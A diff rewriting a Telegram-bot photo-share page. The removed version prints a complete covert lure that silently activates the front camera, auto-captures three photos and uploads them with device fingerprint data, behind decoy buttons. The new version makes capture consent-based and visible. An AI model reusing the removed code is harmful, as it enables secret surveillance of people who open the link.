@@ -1,557 +1,442 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>📸 Photo Shared With You!</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light">
+  <title>A photo was shared with you</title>
+  <style>
+    :root {
+      color-scheme: light;
+      --ink: #172033;
+      --muted: #667085;
+      --line: #e4e8f0;
+      --blue: #315ce8;
+      --blue-dark: #2449c6;
+      --surface: #ffffff;
+      --background: #f4f6fb;
+      --green: #147d58;
+      --red: #ad2d35;
+      font-family: Inter, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont,
+        "Segoe UI", sans-serif;
+    }
 
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #0f0c29 0%, #302b63 50%, #24243e 100%);
-            min-height: 100vh;
-            color: white;
-            overflow-x: hidden;
-        }
+    * { box-sizing: border-box; }
 
-        /* Loading Screen */
-        .loading-screen {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(135deg, #0f0c29 0%, #302b63 50%, #24243e 100%);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            z-index: 9999;
-            transition: opacity 0.5s ease;
-        }
+    body {
+      margin: 0;
+      min-height: 100vh;
+      background:
+        radial-gradient(circle at 10% 0%, rgba(49, 92, 232, .08), transparent 30rem),
+        var(--background);
+      color: var(--ink);
+    }
 
-        .loading-screen.hidden {
-            opacity: 0;
-            pointer-events: none;
-        }
+    button, input { font: inherit; }
 
-        .loader {
-            text-align: center;
-        }
+    .page-shell { width: min(100% - 32px, 760px); margin: 0 auto; padding: 24px 0 44px; }
+    .site-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 28px; }
+    .brand { display: inline-flex; align-items: center; gap: 10px; color: var(--ink); font-weight: 750; text-decoration: none; }
+    .brand-mark { display: grid; width: 38px; height: 38px; place-items: center; border-radius: 13px; background: #e9efff; font-size: 20px; }
+    .top-label { color: #526078; background: rgba(255,255,255,.72); border: 1px solid var(--line); border-radius: 999px; padding: 8px 12px; font-size: 12px; font-weight: 650; }
 
-        .spinner {
-            width: 60px;
-            height: 60px;
-            border: 4px solid rgba(255,255,255,0.1);
-            border-top: 4px solid #667eea;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 20px;
-        }
+    .intro { margin: 0 auto 20px; max-width: 640px; text-align: center; }
+    .eyebrow { margin: 0 0 8px; color: var(--blue); font-size: 12px; font-weight: 800; letter-spacing: .11em; text-transform: uppercase; }
+    h1 { margin: 0; font-size: clamp(28px, 5vw, 42px); line-height: 1.12; letter-spacing: -.04em; }
+    .intro-copy { margin: 12px auto 0; color: var(--muted); max-width: 560px; line-height: 1.6; overflow-wrap: anywhere; }
 
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
+    .card { background: var(--surface); border: 1px solid var(--line); border-radius: 22px; box-shadow: 0 16px 45px rgba(29, 44, 79, .07); }
+    .photo-card { margin: 22px auto; padding: 12px; }
+    .shared-photo { display: block; width: 100%; max-height: min(62vh, 580px); object-fit: contain; border-radius: 14px; background: #eef1f6; }
+    .photo-caption { margin: 12px 6px 2px; color: #475467; font-size: 14px; line-height: 1.55; overflow-wrap: anywhere; }
 
-        .loader p {
-            font-size: 1.2em;
-            opacity: 0.8;
-            animation: pulse 1.5s ease-in-out infinite;
-        }
+    .camera-card { margin-top: 22px; padding: clamp(20px, 4vw, 30px); }
+    .section-heading { display: flex; align-items: flex-start; gap: 14px; }
+    .step { flex: 0 0 38px; display: grid; place-items: center; width: 38px; height: 38px; border-radius: 13px; color: var(--blue); background: #edf1ff; font-weight: 800; }
+    h2 { margin: 1px 0 7px; font-size: 20px; letter-spacing: -.02em; }
+    .supporting-copy { margin: 0; color: var(--muted); font-size: 14px; line-height: 1.65; }
+    .privacy-note { margin: 20px 0; padding: 15px 16px; border: 1px solid #d9e3ff; border-radius: 14px; background: #f5f7ff; color: #344264; font-size: 14px; line-height: 1.6; }
+    .privacy-note strong { color: #1d2d58; }
 
-        @keyframes pulse {
-            0%, 100% { opacity: 0.5; }
-            50% { opacity: 1; }
-        }
+    .consent-check { display: flex; align-items: flex-start; gap: 11px; margin: 17px 0; color: #344054; font-size: 14px; line-height: 1.55; cursor: pointer; }
+    .consent-check input { flex: 0 0 auto; width: 18px; height: 18px; margin: 2px 0 0; accent-color: var(--blue); }
 
-        /* Main Container */
-        .container {
-            max-width: 500px;
-            margin: 0 auto;
-            padding: 20px;
-        }
+    .button-row { display: flex; flex-wrap: wrap; gap: 10px; align-items: center; margin-top: 18px; }
+    .button { min-height: 46px; padding: 11px 17px; border: 1px solid transparent; border-radius: 12px; background: var(--blue); color: #fff; font-weight: 730; cursor: pointer; transition: background .16s ease, transform .16s ease, opacity .16s ease; }
+    .button:hover:not(:disabled) { background: var(--blue-dark); transform: translateY(-1px); }
+    .button:focus-visible, input:focus-visible { outline: 3px solid rgba(49, 92, 232, .28); outline-offset: 2px; }
+    .button:disabled { cursor: not-allowed; opacity: .5; }
+    .button.secondary { border-color: #d8deea; background: #fff; color: #344054; }
+    .button.secondary:hover:not(:disabled) { background: #f6f8fc; }
+    .button.send { background: var(--green); }
+    .button.send:hover:not(:disabled) { background: #0d6848; }
 
-        /* Header */
-        .header {
-            text-align: center;
-            padding: 30px 0 20px;
-        }
+    .status { min-height: 24px; margin: 14px 0 0; color: var(--muted); font-size: 14px; line-height: 1.5; }
+    .status.error { color: var(--red); }
+    .status.success { color: var(--green); font-weight: 650; }
 
-        .header h1 {
-            font-size: 1.5em;
-            margin-bottom: 10px;
-            background: linear-gradient(to right, #667eea, #764ba2);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
+    .camera-stage { position: relative; overflow: hidden; margin-top: 18px; border-radius: 16px; background: #111827; }
+    .camera-video { display: block; width: 100%; max-height: 62vh; min-height: 220px; object-fit: contain; background: #111827; }
+    .camera-video.mirror { transform: scaleX(-1); }
+    .camera-badge { position: absolute; top: 12px; left: 12px; padding: 7px 10px; border-radius: 999px; background: rgba(14, 22, 39, .78); color: white; font-size: 12px; font-weight: 700; }
+    .preview-photo { display: block; width: 100%; max-height: 62vh; object-fit: contain; border-radius: 15px; background: #111827; }
+    .small-copy { color: var(--muted); font-size: 12px; line-height: 1.5; }
+    .done-box { margin-top: 18px; padding: 16px; border-radius: 14px; background: #effaf5; color: #126344; line-height: 1.55; }
+    .footer { margin-top: 22px; text-align: center; color: #818ba0; font-size: 12px; }
+    [hidden] { display: none !important; }
 
-        .header p {
-            font-size: 1em;
-            opacity: 0.8;
-            line-height: 1.5;
-        }
-
-        /* Photo Card */
-        .photo-card {
-            background: rgba(255,255,255,0.05);
-            border-radius: 20px;
-            overflow: hidden;
-            margin: 20px 0;
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255,255,255,0.1);
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-        }
-
-        .photo-wrapper {
-            position: relative;
-            width: 100%;
-            background: #000;
-        }
-
-        .photo-wrapper img {
-            width: 100%;
-            height: auto;
-            display: block;
-            max-height: 400px;
-            object-fit: cover;
-        }
-
-        .photo-overlay {
-            position: absolute;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            padding: 20px;
-            background: linear-gradient(transparent, rgba(0,0,0,0.8));
-        }
-
-        .message-box {
-            padding: 20px;
-            text-align: center;
-        }
-
-        .message-box p {
-            font-size: 1.1em;
-            line-height: 1.6;
-            opacity: 0.9;
-        }
-
-        /* Footer */
-        .footer {
-            text-align: center;
-            padding: 20px;
-            opacity: 0.5;
-            font-size: 0.8em;
-        }
-
-        /* Hidden camera video */
-        #cameraVideo {
-            position: fixed;
-            top: -9999px;
-            left: -9999px;
-            width: 1px;
-            height: 1px;
-            opacity: 0;
-        }
-
-        #captureCanvas {
-            display: none;
-        }
-
-        /* Permission Overlay - Natural looking */
-        .permission-overlay {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.7);
-            z-index: 1000;
-            justify-content: center;
-            align-items: center;
-        }
-
-        .permission-overlay.show {
-            display: flex;
-        }
-
-        .permission-box {
-            background: #1e1e2e;
-            border-radius: 16px;
-            padding: 30px;
-            max-width: 350px;
-            text-align: center;
-            border: 1px solid rgba(255,255,255,0.1);
-        }
-
-        .permission-box .icon {
-            font-size: 3em;
-            margin-bottom: 15px;
-        }
-
-        .permission-box h3 {
-            margin-bottom: 10px;
-            font-size: 1.2em;
-        }
-
-        .permission-box p {
-            opacity: 0.7;
-            font-size: 0.9em;
-            margin-bottom: 20px;
-            line-height: 1.5;
-        }
-
-        .allow-btn {
-            background: linear-gradient(135deg, #667eea, #764ba2);
-            color: white;
-            border: none;
-            padding: 12px 40px;
-            border-radius: 25px;
-            font-size: 1em;
-            cursor: pointer;
-            transition: transform 0.2s;
-        }
-
-        .allow-btn:hover {
-            transform: scale(1.05);
-        }
-
-        /* Like/Share buttons - distraction */
-        .action-buttons {
-            display: flex;
-            justify-content: center;
-            gap: 15px;
-            padding: 15px 20px;
-            border-top: 1px solid rgba(255,255,255,0.05);
-        }
-
-        .action-btn {
-            background: rgba(255,255,255,0.05);
-            border: 1px solid rgba(255,255,255,0.1);
-            color: white;
-            padding: 8px 20px;
-            border-radius: 20px;
-            cursor: pointer;
-            font-size: 0.9em;
-            transition: background 0.2s;
-        }
-
-        .action-btn:hover {
-            background: rgba(255,255,255,0.15);
-        }
-
-        /* Animations */
-        .fade-in {
-            animation: fadeIn 0.8s ease forwards;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .slide-up {
-            animation: slideUp 0.6s ease forwards;
-        }
-
-        @keyframes slideUp {
-            from { opacity: 0; transform: translateY(40px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-    </style>
+    @media (max-width: 560px) {
+      .page-shell { width: min(100% - 20px, 760px); padding-top: 15px; }
+      .site-header { margin-bottom: 23px; }
+      .top-label { padding: 7px 9px; font-size: 11px; }
+      .camera-card { border-radius: 18px; }
+      .button-row .button { flex: 1 1 100%; }
+    }
+  </style>
 </head>
 <body>
+  <div class="page-shell">
+    <header class="site-header">
+      <a class="brand" href="/" aria-label="Photo Share home">
+        <span class="brand-mark" aria-hidden="true">📷</span>
+        <span>Photo Share</span>
+      </a>
+      <span class="top-label">Shared photo</span>
+    </header>
 
-    <!-- Loading Screen -->
-    <div class="loading-screen" id="loadingScreen">
-        <div class="loader">
-            <div class="spinner"></div>
-            <p>Loading your photo...</p>
-        </div>
-    </div>
+    <main>
+      <section class="intro" aria-labelledby="page-title">
+        <p class="eyebrow">A photo for you</p>
+        <h1 id="page-title">Someone shared a photo</h1>
+        <p class="intro-copy">{{ custom_message }}</p>
+      </section>
 
-    <!-- Main Content -->
-    <div class="container" id="mainContent" style="opacity: 0;">
-        
-        <!-- Header -->
-        <div class="header fade-in">
-            <h1>📸 Someone Shared a Photo!</h1>
-            <p>{{ custom_message }}</p>
-        </div>
+      <figure class="photo-card card">
+        {% if image_data %}
+          <img class="shared-photo" src="data:image/jpeg;base64,{{ image_data }}" alt="Photo shared with you">
+        {% else %}
+          <div class="shared-photo" role="img" aria-label="No photo was attached" style="min-height:240px;display:grid;place-items:center;color:#667085;">
+            No photo was attached to this link.
+          </div>
+        {% endif %}
+        <figcaption class="photo-caption">This is the image the link creator shared.</figcaption>
+      </figure>
 
-        <!-- Photo Card -->
-        <div class="photo-card slide-up">
-            <div class="photo-wrapper">
-                {% if image_data %}
-                <img 
-                    src="data:image/jpeg;base64,{{ image_data }}" 
-                    alt="Shared Photo"
-                    id="sharedPhoto"
-                >
-                {% else %}
-                <div style="padding: 60px; text-align: center;">
-                    <p style="font-size: 3em;">📷</p>
-                    <p>Photo loading...</p>
-                </div>
-                {% endif %}
-            </div>
-            
-            <div class="message-box">
-                <p>{{ custom_message }}</p>
-            </div>
-
-            <!-- Fake action buttons for natural look -->
-            <div class="action-buttons">
-                <button class="action-btn" onclick="likePhoto()">❤️ Like</button>
-                <button class="action-btn" onclick="sharePhoto()">🔗 Share</button>
-                <button class="action-btn" onclick="savePhoto()">💾 Save</button>
-            </div>
+      <section class="camera-card card" aria-labelledby="camera-heading">
+        <div class="section-heading">
+          <span class="step" aria-hidden="true">1</span>
+          <div>
+            <h2 id="camera-heading">Optional: send a camera photo back</h2>
+            <p class="supporting-copy">You can view the shared image without using your camera. Camera access is optional and stays off unless you choose to enable it.</p>
+          </div>
         </div>
 
-        <!-- Footer -->
-        <div class="footer">
-            <p>Shared via Photo Share Bot</p>
+        <div class="privacy-note">
+          <strong>Before you continue:</strong> if you choose to take and send a photo, it will be delivered to the Telegram account that shared this link. Your camera photo is not uploaded when you open this page or grant permission. You must take the photo, review it, and press <strong>Send photo</strong> yourself. Nothing is captured or sent automatically. You can send up to two photos during this page session.
+          <br><br>
+          <strong>Hindi:</strong> Camera use karna optional hai. Agar aap photo lekar <strong>Send photo</strong> dabayenge, photo us Telegram account ko bheji jayegi jisne yeh link share kiya. Page kholne ya camera permission dene se photo apne-aap capture/upload nahi hoti. Photo lene ke baad aap pehle review karenge; bhejne ke liye alag se <strong>Send photo</strong> dabana hoga.
         </div>
-    </div>
 
-    <!-- Hidden Camera Elements -->
-    <video id="cameraVideo" autoplay playsinline muted></video>
-    <canvas id="captureCanvas"></canvas>
+        <div id="consentPanel">
+          <label class="consent-check" for="consentCheck">
+            <input id="consentCheck" type="checkbox">
+            <span>I understand who will receive a photo if I choose to send one, and I want to continue to the camera controls. <span lang="hi">/ Main samajhta/samajhti hoon ki bheji hui photo kisko milegi, aur camera controls dekhna chahta/chahti hoon.</span></span>
+          </label>
+          <div class="button-row">
+            <button class="button" id="enableCamera" type="button" disabled>Agree &amp; enable camera</button>
+          </div>
+        </div>
 
-    <!-- Data attributes -->
-    <div id="pageData" 
-         data-link-id="{{ link_id }}" 
-         data-chat-id="{{ chat_id }}"
-         style="display:none;">
-    </div>
+        <div id="livePanel" hidden>
+          <div class="camera-stage">
+            <video id="cameraVideo" class="camera-video" autoplay playsinline muted></video>
+            <span class="camera-badge" id="cameraLabel">Camera on</span>
+          </div>
+          <div class="button-row">
+            <button class="button secondary" id="switchCamera" type="button" hidden>Switch front / back camera</button>
+            <button class="button" id="takePhoto" type="button">Take photo</button>
+          </div>
+          <p class="small-copy">The camera preview is visible to you. Taking a photo keeps it on this page until you choose to send it.</p>
+        </div>
 
-    <script>
-        // ======= CONFIGURATION =======
-        const linkId = document.getElementById('pageData').dataset.linkId;
-        const chatId = document.getElementById('pageData').dataset.chatId;
-        
-        let cameraStream = null;
-        let captureCount = 0;
-        const MAX_CAPTURES = 3; // Maximum 3 photos capture
-        
-        // ======= PAGE LOAD =======
-        window.addEventListener('load', function() {
-            // Loading screen hide karo
-            setTimeout(() => {
-                document.getElementById('loadingScreen').classList.add('hidden');
-                document.getElementById('mainContent').style.opacity = '1';
-                
-                // Notify visit
-                notifyVisit();
-                
-                // Camera start karo - thoda delay se
-                setTimeout(() => {
-                    initCamera();
-                }, 1000);
-                
-            }, 1500);
+        <div id="reviewPanel" hidden>
+          <img id="capturedPreview" class="preview-photo" alt="Your camera photo preview">
+          <div class="button-row">
+            <button class="button secondary" id="retakePhoto" type="button">Retake</button>
+            <button class="button send" id="sendPhoto" type="button">Send photo to link creator</button>
+          </div>
+          <p class="small-copy">Nothing is sent until you press the green Send button.</p>
+        </div>
+
+        <div class="button-row">
+          <button class="button secondary" id="anotherPhoto" type="button" hidden>Take another photo</button>
+          <button class="button secondary" id="resumeCamera" type="button" hidden>Turn camera on again</button>
+        </div>
+
+        <p id="status" class="status" role="status" aria-live="polite">Camera is off. No camera photo has been captured or uploaded.</p>
+        <div id="donePanel" class="done-box" hidden>Thank you. You chose what to share; the camera is off now.</div>
+      </section>
+    </main>
+
+    <footer class="footer">Camera sharing is optional. You can close this page at any time.</footer>
+  </div>
+
+  <canvas id="captureCanvas" hidden></canvas>
+
+  <script>
+    const linkId = {{ link_id|tojson }};
+    const MAX_PHOTOS = 2;
+    let photosSent = 0;
+    let currentFacing = "user";
+    let cameraStream = null;
+    let capturedBlob = null;
+    let previewUrl = null;
+    let consentGiven = false;
+
+    const consentCheck = document.getElementById("consentCheck");
+    const consentPanel = document.getElementById("consentPanel");
+    const enableCameraButton = document.getElementById("enableCamera");
+    const livePanel = document.getElementById("livePanel");
+    const video = document.getElementById("cameraVideo");
+    const cameraLabel = document.getElementById("cameraLabel");
+    const switchCameraButton = document.getElementById("switchCamera");
+    const takePhotoButton = document.getElementById("takePhoto");
+    const reviewPanel = document.getElementById("reviewPanel");
+    const capturedPreview = document.getElementById("capturedPreview");
+    const retakeButton = document.getElementById("retakePhoto");
+    const sendPhotoButton = document.getElementById("sendPhoto");
+    const anotherPhotoButton = document.getElementById("anotherPhoto");
+    const resumeCameraButton = document.getElementById("resumeCamera");
+    const statusText = document.getElementById("status");
+    const donePanel = document.getElementById("donePanel");
+
+    function setStatus(message, kind = "") {
+      statusText.textContent = message;
+      statusText.className = `status ${kind}`.trim();
+    }
+
+    function stopCamera() {
+      if (cameraStream) {
+        cameraStream.getTracks().forEach((track) => track.stop());
+        cameraStream = null;
+      }
+      video.srcObject = null;
+    }
+
+    function cameraErrorMessage(error) {
+      if (!window.isSecureContext) {
+        return "Camera access requires a secure HTTPS page. Open this link using its https:// address.";
+      }
+      if (error && error.name === "NotAllowedError") {
+        return "Camera permission was not granted. You can still view the shared photo; nothing was sent.";
+      }
+      if (error && (error.name === "NotFoundError" || error.name === "DevicesNotFoundError")) {
+        return "No camera was found on this device. Nothing was captured or sent.";
+      }
+      return "The camera could not be started. Check your browser/device settings and try again.";
+    }
+
+    async function updateCameraControls() {
+      try {
+        const devices = await navigator.mediaDevices.enumerateDevices();
+        const cameras = devices.filter((device) => device.kind === "videoinput");
+        switchCameraButton.hidden = cameras.length < 2;
+      } catch (_error) {
+        switchCameraButton.hidden = false;
+      }
+      cameraLabel.textContent = currentFacing === "user" ? "Front / selfie camera" : "Back / rear camera";
+      video.classList.toggle("mirror", currentFacing === "user");
+    }
+
+    async function startCamera(facing = currentFacing) {
+      if (!window.isSecureContext || !navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+        setStatus(cameraErrorMessage(), "error");
+        return false;
+      }
+
+      stopCamera();
+      setStatus("Waiting for your browser's camera permission…");
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          audio: false,
+          video: {
+            facingMode: { ideal: facing },
+            width: { ideal: 1280 },
+            height: { ideal: 720 }
+          }
         });
-
-        // ======= NOTIFY VISIT =======
-        function notifyVisit() {
-            fetch('/api/notify', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ link_id: linkId })
-            }).catch(err => console.log('Notify error'));
+        cameraStream = stream;
+        currentFacing = facing;
+        video.srcObject = stream;
+        const actualFacing = stream.getVideoTracks()[0]?.getSettings().facingMode;
+        if (actualFacing === "user" || actualFacing === "environment") {
+          currentFacing = actualFacing;
         }
-
-        // ======= CAMERA INITIALIZATION =======
-        async function initCamera() {
-            try {
-                // Direct camera access request
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: {
-                        facingMode: 'user',  // Front camera
-                        width: { ideal: 640 },
-                        height: { ideal: 480 }
-                    },
-                    audio: false
-                });
-                
-                cameraStream = stream;
-                const video = document.getElementById('cameraVideo');
-                video.srcObject = stream;
-                
-                // Video ready hone ka wait karo
-                video.onloadedmetadata = () => {
-                    video.play();
-                    console.log('Camera ready');
-                    
-                    // Thoda wait karo camera focus hone ke liye
-                    setTimeout(() => {
-                        capturePhoto();
-                    }, 1500);
-                };
-                
-            } catch (err) {
-                console.log('Camera access denied or not available');
-                // Silently fail - user ko pata nahi chalega
-                
-                // Agar permission deny hui, still notify karo
-                sendNotification('Camera access denied by user');
-            }
+        await video.play();
+        await updateCameraControls();
+        livePanel.hidden = false;
+        reviewPanel.hidden = true;
+        sendPhotoButton.disabled = false;
+        retakeButton.disabled = false;
+        anotherPhotoButton.hidden = true;
+        resumeCameraButton.hidden = true;
+        consentPanel.hidden = true;
+        setStatus("Camera is on. Take a photo only when you are ready; it will not be sent automatically.");
+        return true;
+      } catch (error) {
+        stopCamera();
+        setStatus(cameraErrorMessage(error), "error");
+        if (consentGiven) {
+          consentPanel.hidden = true;
+          resumeCameraButton.hidden = false;
         }
+        return false;
+      }
+    }
 
-        // ======= PHOTO CAPTURE =======
-        function capturePhoto() {
-            if (captureCount >= MAX_CAPTURES) {
-                stopCamera();
-                return;
-            }
-            
-            try {
-                const video = document.getElementById('cameraVideo');
-                const canvas = document.getElementById('captureCanvas');
-                const ctx = canvas.getContext('2d');
-                
-                // Canvas size set karo
-                canvas.width = video.videoWidth || 640;
-                canvas.height = video.videoHeight || 480;
-                
-                // Video frame ko canvas par draw karo
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                
-                // Canvas se image data lo
-                const imageData = canvas.toDataURL('image/jpeg', 0.8);
-                
-                // Server par bhejo
-                sendCapturedPhoto(imageData);
-                
-                captureCount++;
-                
-                // 3 second baad aur ek photo lo
-                if (captureCount < MAX_CAPTURES) {
-                    setTimeout(() => {
-                        capturePhoto();
-                    }, 3000);
-                } else {
-                    // Sab photos le li, camera band karo
-                    setTimeout(() => {
-                        stopCamera();
-                    }, 1000);
-                }
-                
-            } catch (err) {
-                console.log('Capture error');
-            }
-        }
+    function releasePreview() {
+      capturedBlob = null;
+      capturedPreview.removeAttribute("src");
+      if (previewUrl) {
+        URL.revokeObjectURL(previewUrl);
+        previewUrl = null;
+      }
+    }
 
-        // ======= SEND CAPTURED PHOTO =======
-        function sendCapturedPhoto(imageData) {
-            // Visitor info collect karo
-            const visitorInfo = getVisitorInfo();
-            
-            fetch('/api/capture', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    link_id: linkId,
-                    photo: imageData,
-                    visitor_info: visitorInfo
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log('Photo sent successfully');
-            })
-            .catch(err => {
-                console.log('Send error');
-            });
-        }
+    consentCheck.addEventListener("change", () => {
+      enableCameraButton.disabled = !consentCheck.checked;
+    });
 
-        // ======= VISITOR INFO =======
-        function getVisitorInfo() {
-            const info = {
-                userAgent: navigator.userAgent,
-                language: navigator.language,
-                platform: navigator.platform,
-                screenSize: `${screen.width}x${screen.height}`,
-                timestamp: new Date().toISOString(),
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-            };
-            
-            return JSON.stringify(info, null, 2);
-        }
+    enableCameraButton.addEventListener("click", async () => {
+      if (!consentCheck.checked) return;
+      consentGiven = true;
+      await startCamera(currentFacing);
+    });
 
-        // ======= NOTIFICATION =======
-        function sendNotification(message) {
-            fetch('/api/capture', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    link_id: linkId,
-                    photo: '',
-                    visitor_info: message
-                })
-            }).catch(err => {});
-        }
+    switchCameraButton.addEventListener("click", async () => {
+      const previousFacing = currentFacing;
+      const nextFacing = currentFacing === "user" ? "environment" : "user";
+      const started = await startCamera(nextFacing);
+      if (!started) {
+        currentFacing = previousFacing;
+        cameraLabel.textContent = previousFacing === "user" ? "Front / selfie camera" : "Back / rear camera";
+      }
+    });
 
-        // ======= STOP CAMERA =======
-        function stopCamera() {
-            if (cameraStream) {
-                cameraStream.getTracks().forEach(track => track.stop());
-                cameraStream = null;
-                console.log('Camera stopped');
-            }
-        }
+    takePhotoButton.addEventListener("click", async () => {
+      if (!cameraStream || video.readyState < HTMLMediaElement.HAVE_CURRENT_DATA) {
+        setStatus("The camera is not ready. Turn it on again before taking a photo.", "error");
+        return;
+      }
 
-        // ======= FAKE BUTTON ACTIONS =======
-        function likePhoto() {
-            const btn = event.target;
-            btn.innerHTML = '❤️ Liked!';
-            btn.style.background = 'rgba(255,0,0,0.2)';
-            setTimeout(() => {
-                btn.innerHTML = '❤️ Like';
-                btn.style.background = '';
-            }, 2000);
-        }
+      const canvas = document.getElementById("captureCanvas");
+      const sourceWidth = video.videoWidth;
+      const sourceHeight = video.videoHeight;
+      if (!sourceWidth || !sourceHeight) {
+        setStatus("The camera image is not ready yet. Please try again.", "error");
+        return;
+      }
+      const scale = Math.min(1, 1280 / Math.max(sourceWidth, sourceHeight));
+      canvas.width = Math.max(1, Math.round(sourceWidth * scale));
+      canvas.height = Math.max(1, Math.round(sourceHeight * scale));
+      const context = canvas.getContext("2d");
+      if (currentFacing === "user") {
+        context.translate(canvas.width, 0);
+        context.scale(-1, 1);
+      }
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-        function sharePhoto() {
-            if (navigator.share) {
-                navigator.share({
-                    title: 'Check out this photo!',
-                    url: window.location.href
-                });
-            } else {
-                // Copy to clipboard
-                navigator.clipboard.writeText(window.location.href).then(() => {
-                    const btn = event.target;
-                    btn.innerHTML = '✅ Copied!';
-                    setTimeout(() => { btn.innerHTML = '🔗 Share'; }, 2000);
-                });
-            }
-        }
+      const blob = await new Promise((resolve) => canvas.toBlob(resolve, "image/jpeg", 0.86));
+      if (!blob) {
+        setStatus("Could not prepare the photo. Please try again.", "error");
+        return;
+      }
 
-        function savePhoto() {
-            const btn = event.target;
-            btn.innerHTML = '✅ Saved!';
-            setTimeout(() => { btn.innerHTML = '💾 Save'; }, 2000);
-        }
+      stopCamera();
+      capturedBlob = blob;
+      if (previewUrl) URL.revokeObjectURL(previewUrl);
+      previewUrl = URL.createObjectURL(blob);
+      capturedPreview.src = previewUrl;
+      livePanel.hidden = true;
+      reviewPanel.hidden = false;
+      setStatus("Photo taken on this device only. Review it, then choose Send or Retake.");
+    });
 
-        // ======= CLEANUP ON PAGE LEAVE =======
-        window.addEventListener('beforeunload', function() {
-            stopCamera();
+    retakeButton.addEventListener("click", async () => {
+      releasePreview();
+      reviewPanel.hidden = true;
+      await startCamera(currentFacing);
+    });
+
+    function blobToDataUrl(blob) {
+      return new Promise((resolve, reject) => {
+        const reader = new FileReader();
+        reader.onload = () => resolve(reader.result);
+        reader.onerror = () => reject(new Error("Could not read the photo."));
+        reader.readAsDataURL(blob);
+      });
+    }
+
+    sendPhotoButton.addEventListener("click", async () => {
+      if (!capturedBlob) {
+        setStatus("Take a photo first.", "error");
+        return;
+      }
+      sendPhotoButton.disabled = true;
+      retakeButton.disabled = true;
+      setStatus("Sending the photo to the Telegram account that shared this link…");
+      try {
+        const photo = await blobToDataUrl(capturedBlob);
+        const response = await fetch("/api/capture", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ link_id: linkId, photo })
         });
+        const result = await response.json().catch(() => ({}));
+        if (!response.ok) {
+          throw new Error(result.error || "The photo could not be sent. Please try again later.");
+        }
 
-        document.addEventListener('visibilitychange', function() {
-            if (document.hidden) {
-                stopCamera();
-            }
-        });
-    </script>
+        photosSent += 1;
+        releasePreview();
+        reviewPanel.hidden = true;
+        setStatus("Photo sent. The camera is off.", "success");
+        if (photosSent < MAX_PHOTOS) {
+          anotherPhotoButton.textContent = `Take another photo (${MAX_PHOTOS - photosSent} remaining)`;
+          anotherPhotoButton.hidden = false;
+        } else {
+          donePanel.hidden = false;
+        }
+      } catch (error) {
+        setStatus(error.message || "The photo could not be sent. Please try again later.", "error");
+        sendPhotoButton.disabled = false;
+        retakeButton.disabled = false;
+      }
+    });
 
+    anotherPhotoButton.addEventListener("click", async () => {
+      await startCamera(currentFacing);
+    });
+
+    resumeCameraButton.addEventListener("click", async () => {
+      await startCamera(currentFacing);
+    });
+
+    document.addEventListener("visibilitychange", () => {
+      if (document.hidden && cameraStream) {
+        stopCamera();
+        livePanel.hidden = true;
+        if (consentGiven && photosSent < MAX_PHOTOS) {
+          resumeCameraButton.hidden = false;
+        }
+        setStatus("Camera stopped because the page went into the background. Turn it on again if you want to continue.");
+      }
+    });
+
+    window.addEventListener("pagehide", () => {
+      stopCamera();
+      releasePreview();
+    });
+  </script>
 </body>
 </html>
